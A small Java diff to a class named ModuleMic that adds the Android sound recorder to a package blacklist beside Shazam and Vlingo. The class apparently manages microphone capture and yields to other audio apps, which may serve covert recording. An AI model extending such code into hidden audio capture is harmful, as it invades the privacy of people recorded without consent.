@@ -81,7 +81,7 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 	boolean phoneListening;
 	private Observer<ProcessInfo> processObserver;
 
-	Set<String> blacklist = new HashSet<String>();
+	public Set<String> blacklist = new HashSet<String>();
 
 	public ModuleMic() {
 		super();
@@ -92,6 +92,7 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 		blacklist.clear();
 		addBlacklist("shazam");
 		addBlacklist("com.vlingo.midas");
+		addBlacklist("com.android.soundrecorder");
 	}
 
 	public synchronized void addBlacklist(String black) {
